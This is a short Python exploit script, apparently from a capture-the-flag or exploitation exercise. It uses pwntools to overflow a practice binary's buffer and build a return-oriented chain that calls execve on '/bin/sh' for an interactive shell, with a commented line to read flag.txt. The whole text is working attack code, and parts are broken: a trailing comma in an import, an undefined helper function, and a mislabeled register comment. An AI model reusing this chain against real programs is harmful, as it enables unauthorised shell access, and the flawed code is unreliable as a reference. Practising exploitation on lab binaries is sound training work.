from pwn import *
import angr, angrop,
# make pwntools shut up!!!
logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = 'bins3/bin-ret2syscall-2'
b = get2overflow(binary)
p = process(binary)
e = ELF(binary)
r = ROP(e)

buf = b'A'*b.buf()
chain = b''


# populate arg1 - rdi
chain += p64((r.find_gadget(['pop rax', 'ret']))[0])
chain += p64(59)

# populate arg1 - rdi
chain += p64((r.find_gadget(['pop rdi', 'ret']))[0])
chain += p64(next(e.search(b'/bin/sh\x00')))

# populate arg2 - rsi
#chain += p64((r.find_gadget(['pop rsi', 'ret']))[0])
#chain += p64(0)

# populate arg3 - rdx
#chain += p64((r.find_gadget(['pop rdx', 'ret']))[0])
#chain += p64(0)

# call syscall
chain += p64((r.find_gadget(['syscall', 'ret']))[0])

chain += p64(e.sym['execve'])

p.sendline(buf + chain)
#p.sendline(b'cat flag.txt') # just in case
p.interactive()
